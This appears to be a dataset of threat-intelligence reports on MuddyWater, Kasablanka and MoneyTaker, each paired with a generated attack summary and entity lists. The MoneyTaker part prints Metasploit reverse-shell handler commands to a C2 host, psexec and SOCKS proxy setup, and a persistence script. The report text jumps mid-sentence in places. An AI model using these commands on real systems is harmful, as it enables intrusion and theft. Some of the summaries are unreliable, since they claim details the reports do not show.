potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documentsMaking sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7. FIN7 is a threat actor group that is ﬁnancially motivated with targets in the  restaurant, services and ﬁnancial sectors. Following the trail of existing public reporting, the tie to FIN7 is  essentially made based on a download observed from a MuddyWater C2, of a non-public tool “DNSMessenger”. For example, Morphisec wrote: “Later in our investigation, the same command server also delivered a variant of the DNS messenger similar to that described by Talos. The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE. The use of the DNSMessenger tool appears primarily linked to FIN7, with no other samples being attributable to MuddyWater. This led us to query the relationship between the newer attacks we were looking at and the alleged FIN7 link. As part of this research, we came up with the following hypotheses along with their likelihoods, and a rationale for each one. Whilst this may seem an attractive hypothesis to some, there are aspects on the technical side that simply don’t add up. Primarily, there are signiﬁcant disparities between FIN7 and MuddyWater,  speciﬁcally in terms of: Malware unique to FIN7, or commonly used by them has not yet been seen in any MuddyWater investigations (except for the single observation of the DNSMessenger sample) Other non-public malware and tools used by MuddyWater have not been observed in our FIN7 investigations. From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”When these points are considered together in conjunction with the signiﬁcant diﬀerence in targeting they   make a strong case for classifying this activity as distinct from FIN7 activity. We have attempted to ﬁnd examples of code available in public data sources that would generate the  variation of the DNSMessenger malware and had little luck in doing so. Even though the code for DNSMessenger is publicly available following research into attackers published by 3 parties, attackers would have to write the corresponding server side to use it, and as such they may well choose to use the public DNS_TXT_Pwnage.ps1 script instead. Despite this, based on the chain of analysis above we cannot discount the notion that DNSMessenger is shared by multiple attackers, including FIN7 and MuddyWater. Little detail is given on the nature of how the connection between DNSMessenger and MuddyWater was discovered it isn’t possible for us to verify this link. The attackers realized they were under investigation and planted a false ﬂag on their C2 server,  uploading a copy of the FIN7 DNSMessenger code which had been previously mentioned (and was since publicly available) by FireEye and delivering it to researchers to trick them into mis-attributing the campaign. Indeed, the sample shared by Morphisec on PasteBin is identical to the one dropped by the sample discussed in the FireEye FIN7 SEC campaign blog except for the ﬁnal line. Final thoughts Whilst we could conclude with conﬁdence that the attacks discussed in this article are not FIN7 related,  we were not able to answer many of our questions about the MuddyWater attacks. We are currently unable to make a ﬁrm conclusion about the origin of the attackers, or the speciﬁc types of information   they seek out once on a network. In any case we will continue to track their activities to provide protections for our customers. We hope the analysis presented shows the importance of drawing your own conclusions based on the data available to you, not just taking the conclusions given in the public domain at face value. This is especially true when actors who rely on slightly modiﬁed (and publicly available) open source tools are in  play. Copycat threat actors can easily mimic attackers who use open source tools which can confuse attribution eﬀorts meaning more than one aspect of the attacks observed must be considered when  clustering. On top of this, whilst the vast majority of threat analysis in the public domain is repeatable and correct, in some cases it can be diﬃcult to verify the analysis available. When it is hard to reproduce the analysis   the conﬁdence in any conclusions drawn must be lower than it would otherwise be, since you cannot  know for sure that what is stated is true. Palo Alto Networks customers are protected from this threat in the following ways:WildFire and Traps detect all the malware supported in this report as malicious. Traps customers can deploy Heuristic methods to detect attacks that use these techniques. C2 domains used by the attackers are blocked via Threat Prevention.AutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tags: FIN7Appendix A – C2 Addresses 148.251.204[.]131 144.76.109[.]88 138.201.75[.]227Compromised 106[.]187[.]38[.]21 arbiogaz[.]com azmwn[.]suliparwarda[.]com bangortalk[.]org[.]uk best2[.]thebestconference[.]org camco[.]com[.]pk cbpexbrasilia[.]com[.]br cgss[.]com[.]pk diplomat[.]com[.]sa feribschat[.]eu ghanaconsulate[.]com[.]pk magical-energy[.]com school[.]suliparwarda[.]com watyanagr[.]nfe[.]go[.]th whiver[.]in www[.]4seasonrentacar[.]com www[.]akhtaredanesh[.]com www[.]arcadecreative[.]com www[.]armaholic[.]com www[.]asan-max[.]com www[.]autotrans[.]hr www[.]dafc[.]co[.]uk www[.]eapa[.]org www[.]elev8tor[.]com www[.]jdarchs[.]com www[.]kunkrooann[.]comwww[.]mackellarscreenworks[.]com www[.]mitegen[.]com www[.]nigelwhitﬁeld[.]com  www[.]pomegranates[.]org www[.]ridefox[.]com www[.]shapingtomorrowsworld[.]org www[.]vanessajackson[.]co[.]uk www[.]yaran[.]co www[.]ztm[.]waw[.]pl coa[.]inducks[.]org www[.]spearhead-training[.]comAppendix hxxp://106[.]187[.]38[.]21/short_qr/work[.]php?c= hxxp://arbiogaz[.]com/upload/work[.]php?c= hxxp://azmwn[.]suliparwarda[.]com/wp-content/plugins/wpdatatables/panda[.]php?c= hxxp://azmwn[.]suliparwarda[.]com/wp-content/themes/twentyﬁfteen/logs[.]php?c=  hxxp://bangortalk[.]org[.]uk/speakers[.]php?c= hxxp://best2[.]thebestconference[.]org/ccb/browse_cat[.]php?c= hxxp://camco[.]com[.]pk/Controls/data[.]aspx?c= hxxp://cbpexbrasilia[.]com[.]br/wp-content/plugins/wordpress-seo/power[.]php?c=hxxp://cbpexbrasilia[.]com[.]br/wp-includes/widgets/work[.]php?c= hxxp://cgss[.]com[.]pk/data[.]aspx?c= hxxp://diplomat[.]com[.]sa/wp-content/plugins/wordpress-importer/cache[.]php?c= hxxp://feribschat[.]eu/logs[.]php?c= hxxp://ghanaconsulate[.]com[.]pk/data[.]aspx?c= hxxp://magical-energy[.]com/css[.]aspx?c= hxxp://magical-energy[.]com/css/css[.]aspx?c= hxxp://mainandstrand[.]com/work[.]php?c= hxxp://riyadhfoods[.]com/css/edu[.]aspx?c= hxxp://riyadhfoods[.]com/jquery-ui/js/jquery[.]aspx?c= hxxp://school[.]suliparwarda[.]com/components/com_akeeba/work[.]php?c= hxxp://school[.]suliparwarda[.]com/plugins/editors/codemirror/work[.]php?c= hxxp://suliparwarda[.]com/includes/panda[.]php?c= hxxp://suliparwarda[.]com/layouts/joomla/logs[.]php?c= hxxp://suliparwarda[.]com/wp-content/plugins/entry-views/work[.]php?c= hxxp://suliparwarda[.]com/wp-content/themes/twentyﬁfteen/work[.]php?c=  hxxp://tmclub[.]eu/clubdata[.]php?c= hxxp://watyanagr[.]nfe[.]go[.]th/e-oﬃce/lib/work[.]php?c=   hxxp://watyanagr[.]nfe[.]go[.]th/watyanagr/power[.]php?c= hxxp://whiver[.]in/power[.]php?c= hxxp://www[.]4seasonrentacar[.]com/viewsure/data[.]aspx?c= hxxp://www[.]akhtaredanesh[.]com/d/ﬁle/sym/work[.]php?c=  hxxp://www[.]akhtaredanesh[.]com/d/oschool/power[.]php?c= hxxp://www[.]arcadecreative[.]com/work[.]php?c= hxxp://www[.]armaholic[.]com/list[.]php?c= hxxp://www[.]asan-max[.]com/ﬁles/articles/css[.]aspx?c=  hxxp://www[.]asan-max[.]com/ﬁles/articles/large/css[.]aspx?c=  hxxp://www[.]autotrans[.]hr/index[.]php?c= hxxp://www[.]dafc[.]co[.]uk/news[.]php?c= hxxp://www[.]eapa[.]org/asphalt[.]php?c= hxxp://www[.]elev8tor[.]com/show-work[.]php?c= hxxp://www[.]jdarchs[.]com/work[.]php?c= hxxp://www[.]kunkrooann[.]com/inc/work[.]php?c= hxxp://www[.]mackellarscreenworks[.]com/work[.]php?c= hxxp://www[.]mitegen[.]com/mic_catalog[.]php?c= hxxp://www[.]nigelwhitﬁeld[.]com/v2/work[.]php?c=  hxxp://www[.]pomegranates[.]org/index[.]php?c=hxxp://www[.]ridefox[.]com/content[.]php?c= hxxp://www[.]shapingtomorrowsworld[.]org/category[.]php?c= hxxp://www[.]vanessajackson[.]co[.]uk/work[.]php?c= hxxp://www[.]yaran[.]co//wp-content/plugins/so-masonry/logs[.]php?c= hxxp://www[.]yaran[.]co/wp-includes/widgets/logs[.]php?c= hxxp://www[.]ztm[.]waw[.]pl/pop[.]php?c= hxxps://coa[.]inducks[.]org/publication[.]php?c= hxxps://mhtevents[.]com/account[.]php?c= hxxps://skepticalscience[.]com/graphics[.]php?c= hxxps://wallpapercase[.]com/wp-content/themes/twentyﬁfteen/logs[.]php?c=  hxxps://wallpapercase[.]com/wp-includes/customize/logs[.]php?c= hxxps://www[.]spearhead-training[.]com//html/power[.]php?c= hxxps://www[.]spearhead-training[.]com/work[.]php?c=Got something to say?Leave a comment Notify e-mailName (required)Email (required)WebsiteSUBMITSUBSCRIBESUBSCRIBE TO NEWSLETTERSEmailCOMPANY Report a VulnerabilityLEGAL NOTICES Privacy Policy Terms of UseACCOUNT Manage Subscription© 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 866.320.4788SEE A DEMOTAKE A TEST DRIVE ","1. The attackers send malicious Microsoft Word documents to targets, often using logos and branding of organizations the target would trust. 2. The documents prompt the user to enable macros to view the contents. 3. If the user enables macros, the document installs a PowerShell backdoor called POWERSTATS on the system. 4. POWERSTATS connects back to command and control servers operated by the attackers. 5. The attackers use the backdoor access to explore the compromised network and steal data. 6. The attackers periodically make small modifications to their tools and infrastructure, but rely largely on the same basic techniques over time. ",valid_24,"['the attackers', 'targets', 'logos', 'organizations', 'the target', 'the documents', 'the user', 'macros', 'view', 'PowerShell', 'POWERSTATS', 'command', 'data', 'tools', 'infrastructure', 'techniques', 'time']",the attackers; targets; logos; organizations; the target; the documents; the user; macros; view; PowerShell; POWERSTATS; command; data; tools; infrastructure; techniques; time.
"ti.qianxin.com /blog/articles/Kasablanka-Group-Probably-Conducted-Compaigns-Targeting-Russia/ Kasablanka Group Probably Conducted Compaigns Targeting RussiaOverviewAPT groups often use some uncommon file types to host malicious code in order to increase the probability of immunity against antivirus software, such as CD-ROM image files (.iso) and virtual hard disk files (.vhd), which we have monitored for abuse in recent years. And the use of these two formats can effectively circumvent the MOTW mechanism (a security measure in which Windows displays a warning message when a user tries to open a file downloaded from the Internet). The effectiveness of the Lazarus group's attack campaign was evident back in November '22 when we disclosed that its attack components using the vhdx format had a detection rate of 0 on VirusTotal.When combing through the recently uploaded vhdx files we found that from September to December 2022, Kasablanka group is suspected of attacking Russia, and its targets include the Russian Federal Government Cooperation Agency, the Ministry of Foreign Communications of the Astrakhan Region of Russia, etc., and the detection rate of some samples is always 0.Analyzing and organizing the captured samples, the Kasablanka group used a socially engineered phishing email as the entry point for the attack, with a virtual disk image file attached, which nested a variety of next-stage payload executions including lnk files, zip packages, and executables. In the early stages of the attack the final execution was the commercial Trojan Warzone RAT, in the later stages of the attack we observed that the executed Trojan changed to Loda RAT.1/21Decoy FileA phishing attack against the Agency of the Government of the Russian Federation for CIS Affairs, Aliens and International Humanitarian Cooperation, or ""Россотрудничество"".The translation of the phishing email content is as follows：2/21Phishing email attack against the Ministry of Foreign Communications of the Astrakhan Region of Russia.The translation of the phishing email is as follows:3/21One of the phishing email attachments uses the situation related to the Republic of Turkey in 2022 as a bait.Attacks using articles related to Russian import substitution and migration policy in 2015 as bait.4/21In addition, the Kasablanka group intercepted the first page from Resolution No. 1725 published on the official website of the Government of the Russian Federation as a decoy.5/21And the relevant content of the draft Digital Code of Kyrgyzstan was used as a bait.6/21Sample AnalysisThe captured samples are all virtual disk image files (.vhdx suffix), and the sample decoy names and contents are in Russian and uploaded from Russian regions. Some of the samples use lnk files as Loda RAT been sold publicly on the internet as a software subscription since 2018 and is compatible with systems below Windows 10, with remote desktop, password stealing, keylogging, remote commands, permission elevation, download execution and many other remote control functions. It has been used by several APT groups, including Confucius, Bitter, Blind Eagle (APT-Q-98) and other groups .9/21This captured Warzone RAT eventually establishes a TCP connection to the server 0x28Obtain information about the controlled machine Get process list information Get drive information Get directory information Retrieving files from the victim device's folder Delete the specified file Ends the specified process Remote shell Ends the specified thread List the victim's camera device information Turn on the camera Stop the camera Get the title of the active program Exit and delete your own files Downloading files to the controlled end Get browser password Download the file from the given URL to the controlled end and execute it Install HRDP Manager on the victim's device11/21Function 0x4CLoda RATFunctionEnable reverse proxy Stop reverse proxy Start remote VNC Shutting down remote VNC Reverse proxy port settings Execute or open the specified file Injection into the specified process Traversing to get file information Multiple post-command breakdowns, including shutdown, network test, exit, etcLoda RAT is a proprietary malware written in AutoIt script language, first captured and disclosed in the wild by Proofpoint in September 2016, the name 'Loda' derives from the malware author's choice of directory to write keylogger logs to as Loda.Subsequently Cisco discovered multiple variants of Loda RAT and found that the RAT added spying capabilities to the Android platform. After a series of investigations, Cisco concluded that the group using the malware was based in Morocco and named the group Kasablanka (the largest city in Morocco) [1].Analysis of the captured sample showed that it was written in C# and obfuscated so extensively that common tools could not decompile it, and added a large amount of 00 data at the end of the PE file, swelling the entire file size to 741MB.12/21After execution, the sample first releases and executes the Loda RAT packaged with AutoIt in the %appdata% directory, and the AutoIt script can be restored by using the deep analysis function of QiAnXin's Threat Intelligence Center Cloud Sandbox, and the behavior and functions of the trojan can be seen by analyzing the script.Loda RAT first detect antivirus products installed on victim machines through WMI commands.13/21Followed operation is collecting some information of victim host, including permissions, operating system version, etc.14/21And adding persistentence by creating %appdata%\Windata\svshost.exe and NFOKQN.lnk shortcut to svshost.exe in windows startup directory.Uploading the collected information and then takeing screenshots.15/21Subsequently enter the remote control loop, by processing the data returned by C2, and then correspond to the detailed remote control instructions, and its remote control instructions divided into a relatively fine function, rough statistics have 144 remote control instructions, due to the reasons of space, we will not do a detailed introduction, a general overview of its remote control functions.Recording Upload and download files Execute the specified file Shutdown Close the specified process Stealing user cookies, passwords Turn on keylogger Delete keylogger data Download and execute the file from the specified URL Get file or directory size Allow RDP connections by modifying the registry Compressing/uncompressing files Copy files or directories Enumerate connected drives Enumerate hot folder locations Detect UAC settings Send mouse clicks (to the left or right is a separate command） Capture screenshots and send to C2 Open/close CD trays Recording Turn off Windows Firewall Send the name of running processes to C2 Exit, uninstall Create a GUI chat window to save the victim/attacker conversation to a file16/21In addition, in the previous version, LodaRAT downloaded SQLite3.dll from the official AutoIt website because it was needed to extract sensitive information from the browser database, but the embedded URL had been unavailable for download. So in the latest version, the Kasablanka group transcoded it function is to download WinScp tools to synchronize files with remote computers and set scheduled tasks follow-up payload to execute, and the payload is Warzone RAT or CS Trojan.18/21Some security vendors believe that Loda RAT is the exclusive trojan of Kasablanka group, but since Loda RAT is compiled from AutoIt scripts and its source code can be obtained by decompiling it, 'false flag' activities by other threat actors using the decompiled source code are also possible.In terms of attack motivation, we believe that the purpose of this attack is mainly for information gathering and espionage. Considering the current situation between Russia and Ukraine, intelligence spying and espionage are more in line with the motivation of nation-sponsered hacker groups, so we attribute this attack to Kasablanka group with moderate confidence. SummaryIn previous disclosures of the Kasablanka group's operations, its targets included Bangladesh, South America and the United States, and its Loda RAT includes Windows version and Android version.Now this group often uses commercial RATs in its attack activities, which not only reduces the development cost but also makes it difficult for tracing attackers’ footprints.The RedDrip team would like to remind all users not to open links of unknown origin shared by social media, not to click on email attachments from unknown sources, not to run unknown files with exaggerated titles, not to install APPs from informal sources, to back up important files in a timely manner, and to update and install patches.If you need to run or install an application of unknown origin, you can first identify it through the QiAnXin Threat Intelligence File Deep Analysis Platform (url At present, it supports deep analysis of files in various formats including Windows and Android platforms.Currently, a full line of products based on the threat intelligence data from the QiAnXin Threat Intelligence Center, including the QiAnXin Threat Intelligence Platform (TIP), SkyRock, QiAnXin Advanced Threat Detection System, QiAnXin NGSOC, QiAnXin Situational Awareness, etc., already support the accurate Reference Links[1] url url ","1. Send phishing emails with .vhdx file attachments to targets. The emails appear to be official communications related to the Russian government or current events. 2. The .vhdx attachment contains a malicious lnk file or zip archive. 3. The lnk file or zip archive executes scripts that download additional payloads. 4. The payloads include Warzone RAT and Loda RAT, which are remote access Trojans. 5. Loda RAT in particular collects system information, logs keystrokes, takes screenshots, and allows complete remote control. 6. The RATs communicate with command and control servers registered to fake domains by the attackers. 7. Earlier versions embedded the RATs directly in Word documents instead of downloading them. ",valid_47,"['targets', 'PE', 'Russian', 'Execute', 'Download', 'the payload', 'Warzone RAT', 'Loda RAT', 'Trojan', 'information', 'screenshots', 'Allow', 'the RAT', 'the attack']",targets; PE; Russian; Execute; Download; the payload; Warzone RAT; Loda RAT; Trojan; information; screenshots; Allow; the RAT; the attack.
"1MoneyTaker1.5 YEARS OF SILENT OPERATIONSDecember 2017www.group-ib.com2TABLE OF CONTENTSSummaryAttack infrastructureProvision of the malware survivabilityPropagation across the networkSpying on legitimate usersAttack on AWS CBRPotential attacks on SWIFTAttack on card processingUsing banking TrojansUsing POS TrojansRecommendationsIndicators of compromise3711121519252627282931SUMMARY 01From May 2016 to November 2017, at least 20 organisations were attacked in the United States, UK and Russia. At least one of the US banks was successfully robbed twice. In addition to money, attackers stole documentation related to the interbank payment systems, which appear to have been obtained to prepare further attacks. Based on analysis of these incidents, attack tools and the tactics applied, we have concluded that the same group, which Group-IB has dubbed MoneyTaker (after the malware used) is behind these attacks. It is interesting to note that despite the effectiveness of the attacks, they have gone completely unreported till now.3Targets •In total Group-IB has confirmed at least 20 companies as victims of the MoneyTaker group, 16 of which are located in the US. The vast majority of them are small community banks, where hackers attacked card processing systems. The average damage from each successful attack was 500,000 USD baseline.• Criminals stole documentation for OceanSystems’ FedLinkcard processing system, which is used by 200 banks in Latin America and the US. We believe that banks operating on this infrastructure are at risk of being amongst the next targets of MoneyTaker group.•In Russia, they focus on attacks on the system of interbank transfers AWS CBR (Russian Interbank payment system). The average amount of damage caused by this theft scheme is 1.2 million USD per incident. That said, the affected banks managed to return some portion of the stolen money.Tools and tactics Attackers use both borrowed and their own self-written tools. When attacking, hackers act creatively and wisely: they use «one- time» infrastructure and carefully erase traces of their activity post-incident.Infiltration• To penetrate the corporate network, the group uses legitimatepen testing tools - Metasploit and PowerShell Empire.• After successful infection, they carefully erase malwaretraces. However, when investigating one of the incidents, we managed to discover the initial point of compromise: hackers penetrated the bank’s internal network by gaining access to the home computer of the bank’s system administrator.Stealthy techniques• The group uses ‘fileless’ malware which only exists in RAMand is removed on rebooting.4• To protect C&C communications from being detected bysecurity teams, hackers employ SSL certificates generated using names of well-known brands: Bank of America, Federal Reserve Bank, Microsoft, Yahoo, etc.• Servers used to perform initial infection are one-timecomponents which are changed immediately after a successful infection.Attack toolsMembers of the group are skilled enough to promptly adjust the tools applied. In some cases, they made changes to the source code ‘on the fly’ - during the attack.Created toolsBorrowed toolsMoneyTaker 5.0 - malicious program for auto replacement of payment data in AWS CBR‘Screenshotter’ and ‘keylogger’ to conduct espionage and capture keystrokesMetasploit and PowerShell EmpirePrivilege escalation tools, whose code were demonstrated as a Proof of Concept at ZeroNights cybersecurity conference in Moscow in 2016. More data provided later in this reportMoneytaker ‘Auto-replacement’ program to substitute payment details in the interbank transfer systemCitadel and Kronos Banking Trojans. The latter one was used to deliver a Point-of-Sale (POS) malware dubbed ScanPOSTracking the attacks • Servers used to conduct the attacks were specificallyconfigured to deliver the malicious payload to a pre- determined list of IP addresses belonging to the target company. This methodology was employed by attackers to prevent the payload from falling into the hands of security analysts and experts.• After each round of attacks, hackers deploy new infrastructurefor network persistence.•In detected incidents, criminals used a program that should have carefully removed all components of the programs applied. However, due to an error made by the developer, the data were not deleted from the attacked machines, which enabled forensic experts to learn details of the hackers’ activity.5Interrelations between incidents In 1.5 years, Group-IB confirmed 20 incidents in total. Initially we divided these incidents into three groups and considered them as separate. However, through in-depth investigation of the infrastructure, tools, and tactics applied, which will be further covered in this report, we have concluded that one group is behind all these attacks – MoneyTaker. This is supported by technical analysis provided later in this report:Group 1Group 2Group 317 incidents in US and UK organizations. In the majority of instances, hackers used the same C&C server to control the initial part of their attacks. In some cases, we saw a similar use of the infrastructure from which remote connections were performed using LogMeIn.Common features of Groups 1-32 incidents occurred in Russia in the autumn of 2016. The two attacks occurred at the same time; in both cases Meterpreter was used to attack the same target – servers of the Russian interbank transfer system (AWS CBR).1 incident in Russia in the autumn of 2017. The attack was conducted on the AWS CBR using Meterpreter.• Metasploit used to infiltrate corporate networks • SSL certificates generated using popular brands to protect traffic between Meterpreter and C&C • Russian-speaking attackers • Own developers who create unique tools • Modification of the malicious code during attack • Covering tracks of the initial infection vector • Setting up forwarding corporate emails to Yandex and Mail.ru, free mail services.Common features of Groups 2 and 3 • Originally targeted AWS CBR in Russia • Using domains in the .ga zone • Similar manner of propagation across the network. was available back in 2013. The current version of this remote provider, UKUS Financial Services Provider (Breach not confirmed)Bank, RussiaBank,Russia AWS CBR2016Bank, USA First Data STARJANUARYFEBRUARYMARCHAPRILMAYJUNEJULYAUGUSTSEPTEMBEROCTOBERNOVEMBERDECEMBERBank, USA, UTBank, USA, NYBank, USA, VABank, USA, COBank, USA, FLBank, USA, SCCredit Union, USA2017Bank, USA, ILBank, USA, ILBank, USA, WIBank, USA, OKBank, Russia AWS CBRJANUARYFEBRUARYMARCHAPRILMAYJUNEJULYAUGUSTSEPTEMBEROCTOBERNOVEMBERDECEMBERBank, USA, MOBank, USA, CALaw Firm, USA, NCBank, USA, CATimeline of initial infections in attacks: • The very first attack, which Group-IB attributes to MoneyTaker was conducted in the spring of 2016, when funds were stolen from a US bank by gaining access to First Data’s STAR card processing system.•••In September 2016, Group-IB tracked several attacks on banks in Russia. The main target was the AWS CBR (Automated Work Station Client of the Russian Central Bank), a Russian interbank fund transfer system similar to SWIFT. After a successful theft from one of the attacked banks, the incidents stopped, similar to the case of theft in the United States.In November 2016, attackers deployed new infrastructure, which was then used to attack banks in the United States. The last activity in this wave of attacks was tracked in June 2017.In November 2017, we observed a new successful attack by this group in Russia. Like in 2016, they managed to steal funds through the interbank transfers system.702ATTACK INFRASTRUCTURETo conduct targeted attacks, hackers use a distributed infrastructure that is difficult to track.A rather unique feature of the infrastructure is the presence of a Persistence server, which delivers the payload only to real victims whose IP addresses are added to the whitelist.12345Stager request payloadPayloadSetup encrypted tunnel with backconnectRequest stager after rebootResponse with stager if IP in whitelistPentest framework and backconnectserverPersistence server(response to whitelisted IPs)VICTIMPentest framework server This server is used to perform the main activity. On it, hackers install a legitimate tool for penetration testing - Metasploit to further control the full attack.8Nameasys.exelaunch-paranoid- initiates outbound SSL connections which helps to avoid detection of suspicious connections by network security systems. Below is code executed within the Metasploit console by the attacker:use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse _ https set LHOST _ c2serverIP _ set LPORT 443 set HandlerSSLCert /root/.msf4/loot/20161031010327 _ set StagerVerifySSLCert true set EnableStageEncoding true set StageEncoder x86/shikata _ ga _ nai set ExitOnSession falseBy default, Metasploit generates self-signed SSL certificates and specifies random values in the following fields: Valid from, Valid till, Common name. Such certificates can also cause suspicion.9In order to avoid detection, the MoneyTaker group generates self- signed SSL certificates before the attack, indicating the names of popular brands in the fields, instead of filling them out randomly.Group-IB specialists have discovered the use of the following Hackers try to stay as inconspicuous as possible, and therefore they use ‘fileless’ malware which only exists in RAM and is destroyed after reboot.That said, PowerShell and VBS scripts help them to ensure persistence in the system.Scripts provide the following benefits for attackers:• Malicious scripts are hard to detect by means of antivirusprotection. Writing a signature for a script without false positives is much more difficult than a binary file.• Scripts are easy to modify, which makes it easier for attackersto work.•It is easy to ensure persistence. Typically, such scripts are stored in the registry or are called when certain events occur through Windows Management Instrumentation (WMI), Group Policy Objects (GPOs), Scheduled task. Such scripts are very simple and usually their main task is to download the main program from an external or local source and run it.10The Persistence server is used to force a malicious file to be launched if the attacked computer has been rebooted. A distinctive feature of this group is the use of a separate server for this goal.On the server, they run a script that performs two checks:1. Checks if the User-agent field is equal to WinHttp. If it is not equal, requests are sent back to the web server with a 404 error code (page not found). If equal to WinHttp, it performs the second check.2. Checks if the IP address from which the request is made is on the white list. If yes, then the malicious file mencstager.exe is delivered. If not, rundll32.exe is transferred. 51138beea3e2c21e c44d0932c71762a8 – a legitimate Windows file.This verification complicates investigative activity of researchers who cannot get the malicious file because they try to download it from an IP address that is not on the white list.11PROVISION OF THE MALWARE SURVIVABILITY03Unlike other groups conducting targeted attacks, MoneyTaker uses standard techniques to provide malware survivability in the system.Researchers have not managed to recover the full picture of the incidents that occurred in the autumn of 2016 in Russia, because tracks of successful attacks were carefully removed. However, Group-IB has discovered that hackers infiltrated the network of a Russian bank by gaining access to the home computer of the bank’s system administrator. One of the methods to ensure malware survivability in the system was the creation of services using .bat scripts that launched the VNC server.The contents of the at1.bat file:«c:\Program Files\Cisco Systems\VPN Client\hostsec32.exe» -install «Host Security Server»The contents of the at2.bat file:«c:\Program Files\Cisco Systems\VPN Client\hostsec32.exe» -uninstall «host security server»These batch files were called from Windows Task Scheduler.In US incidents, the attacker used VBS scripts that created a link named «Task Scheduler» for a specific user in the startup to launch the malicious file.Set oWS = WScript.CreateObject(«WScript.Shell») sLinkFile = «C:\Users\<%username%>\AppData\Roaming\Microsoft\ Windows\Start Menu\Programs\Startup\taskhost.lnk» Set oLink = oWS.CreateShortcut(sLinkFile) oLink.TargetPath = «C:\Users\<%username%>\AppData\Local\ Temp\taskhost.exe» ‘ oLink.Arguments = «» ‘ oLink.Description = «Task Scheduler» ‘ oLink.HotKey = «ALT+CTRL+F» ‘ oLink.IconLocation = «C:\Users\<%username%>\AppData\Local\ Temp\taskhost.exe, 2» ‘ oLink.WindowStyle = «1» ‘ oLink.WorkingDirectory = «C:\Users\<%username%>\AppData\ Local\Temp» oLink.Save1204PROPAGATION ACROSS THE NETWORKAfter successfully infecting one of the computers and gaining initial access to the system, the attacker performs reconnaissance of the local network in order to gain domain administrator privileges and eventually consolidate control over the network.Hackers use the Metasploit tool to conduct network reconnaissance, search for vulnerable applications, exploit vulnerabilities, escalate systems privileges, and collect information.Gaining admin privileges To escalate privileges up to the local administrator (or “SYSTEM” local user), attackers use exploit modules from the standard Metasploit pack, or exploits designed to bypass the UAC technology. With local administrator privileges they can use the Mimikatz program, which is loaded into the memory using Meterpreter, to extract unencrypted Windows credentials.In addition to the standard modules from the Metasploit pack, the was compiled on October 23, 2016 based on codes presented at the Russian conference ZeroNights 2016. The codes are available online at url lives.13In addition, they actively searched for passwords stored in Active Directory group policies by exploiting the MS14-025 vulnerability and the corresponding Metasploit module (post/windows/gather/ credentials/gpp).After receiving group policy files, the attacker decrypted the passwords that were stored there and used them on other workstations. In some cases, passwords of bank systems’ accounts granting local administrator privileges were very weak. Here is an example of domain administrator passwords that attackers recovered:User nameEncrypted value of the password fieldDecrypted passwordAdministratorUj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KYWrongpassword1Administratorn8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzISystem321Using the Metasploit modules with the functionality of dumping Windows local users’ password hashes stored in the Security Accounts Manager (hashdump or smart_hashdump modules), hackers received the local administrator’s NTLM hash, as well as the NTLM hash and unencrypted password for domain users.Propagation across the network To get the list of computers in Active Directory, hackers often use a PowerShell script named allpc.ps1, which was copied from this discussion in October 2015:url computers-in-multiple-ous-in-adTo propagate across the network, hackers used a legitimate tool psexec, which is typical for network administrators. This tool creates a local service via SMB/RPC protocol, then executes and deletes it. In the service properties, the required command is set to start. The attacker used two methods to distribute the payload: they placed executable files in the network folder, and forced the attacked computers to start them, or indicated the shell code directly in the service start line.For passwords that were received as an NTLM hash and were not decrypted, the Pass-the-hash technique was used, which allows using an NTLM hash for authentication without password. To do this, the same legitimate Metasploit’s psexec modules were used without any modification.14use auxiliary/admin/smb/psexec _ command set SMBUser Administrator adf1794f475c23cd set SMBDomain WORKGROUPAfter gaining access to new systems, attackers repeated the above-mentioned procedure to collect passwords.Remote access Until October 2017, hackers remotely accessed systems of interest using standard Metasploit tools, as well as legitimate remote access programs.On hosts where Meterpreter was launched, hackers set up a SOCKS proxy server, which allowed them to remotely send commands within the local network. To create a connection via SOCKS proxy, they primarily used ports 7080 and 1808:use auxiliary/server/socks4a show options set SRVHOST _ c2serverIP _ set SRVPORT 7080In addition, they actively used various VNC clients such as Fileless VNC, VNC, UltraVNC and TightVNC Portable versions x32 and x64.In the US, they used the LogMeIn Hamachi solution for remote access.In one incident, to ensure continuous remote access, hackers gained access to the firewall, where they configured a tunnel to the C&C server.Also, to secure connections to its C&C server, hackers established an SSH tunnel using a legitimate tool - Plink.1505SPYING ON LEGITIMATE USERSTo conduct a successful attack, hackers need to monitor legitimate activity of the victim bank’s users and financial operators to then repeat the same actions.The MoneyTaker group uses the following tools to spy on employees:• A legitimate tool NirCmd• Self-developed tools - ‘screenshotter’ and ‘keylogger’NirCmd is a small command-line utility, with the functionality similar to psexec. It allows hackers to remotely execute various commands: write and delete values and keys in the Registry, write values into INI file, connect to a VPN network, restart windows or shut down the computer, change the created/modified date of a file, change display settings, turn off the monitor, and many more.One of the most important capabilities for attackers is taking screenshots. For example, by running the following command:nircmd.exe loop 10 60000 savescreenshot c:\temp\ scr~$currdate.MM _ dd _ yyyy$-~$currtime.HH _ mm _ ss$.png10 screenshots will be taken with an interval of 60 seconds.However, this functionality was not enough for the group, therefore they created their own unique tools designed to take 36a90375ddKeylogger/Screenshotter16These programs are designed to capture keystrokes, take screenshots of the user’s desktop and get the contents from the clipboard. All this data can be stored in a file of the temporary directory.Dropper This is an NSIS-packed downloader. Upon its launch it creates the following files:%Temp%\datepicker-ru _ RU.js %Temp%\LEJ%2BPamplona%2BSanta.jpg %Temp%\roknewsflash.css %Temp%\fonts.css %Temp%\addons.css %Temp%\tracker.php %Temp%\mJ8OS5lCf8xFQQiX4F1Ei.sNXbnF1xay %Temp%\<rnd _ chars>.tmp\System.dllThe dropper twice launches its own file as a child process.It decrypts the data buffer, which is stored in the dropper in an encrypted form, and injects it into the child process (which is launched last). That is how the payload is started.Keylogger/Screenshotter • The application is compiled in Delphi. Its main form containstext field components and 5 timers.• Based on the names of components in Portuguese, we assume that either its author is Portuguese-speaking, or the campaign targets Portuguese-speaking countries (for example, Brazil) or the code is based on the source code of the Portuguese program.• Functions of the application are executed once 